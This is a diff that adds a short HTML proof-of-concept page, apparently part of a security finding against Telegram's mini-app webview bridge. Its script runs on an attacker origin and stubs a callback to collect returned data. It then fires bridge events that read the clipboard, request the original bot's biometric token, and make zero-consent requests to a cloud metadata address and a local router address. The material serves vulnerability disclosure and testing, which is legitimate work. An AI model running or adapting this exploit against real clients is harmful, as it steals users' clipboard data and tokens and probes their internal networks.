@@ -1,0 +1,35 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>attacker-origin page (PoC)</title></head>
+<body>
+<h1>Hijacked bridge PoC page</h1>
+<script>
+// This page runs on the ATTACKER origin after the legit mini-app redirected here.
+// It exercises the bridge exactly as a hijacked page would (Finding 4) and
+// captures anything the client sends back via TelegramGameProxy.receiveEvent.
+const exfiltrated = [];
+window.TelegramGameProxy = {
+  receiveEvent: function (name, data) {
+    exfiltrated.push({ name, data });
+    console.log('ATTACKER_RECEIVED ' + JSON.stringify({ name, data }));
+    window.__exfil = exfiltrated;
+  }
+};
+
+function fire() {
+  const P = window.TelegramWebviewProxy;
+  if (!P) { console.log('ATTACKER no proxy'); return; }
+  // 1) read clipboard (gated by attach-menu status of the ORIGINAL bot)
+  P.postEvent('web_app_read_text_from_clipboard', JSON.stringify({ req_id: 'c1' }));
+  // 2) write + read biometric token of the ORIGINAL bot
+  P.postEvent('web_app_biometry_request_auth', JSON.stringify({ req_id: 'b1' }));
+  // 3) zero-consent outbound fetch (IP leak)
+  P.postEvent('web_app_share_to_story', JSON.stringify({ media_url: 'http://169.254.169.254/latest/meta-data/' }));
+  // 4) file download size probe
+  P.postEvent('web_app_request_file_download', JSON.stringify({ url: 'http://192.168.1.1/probe', file_name: 'x.bin' }));
+}
+// fire after stub is ready
+setTimeout(fire, 50);
+</script>
+</body>
+</html>
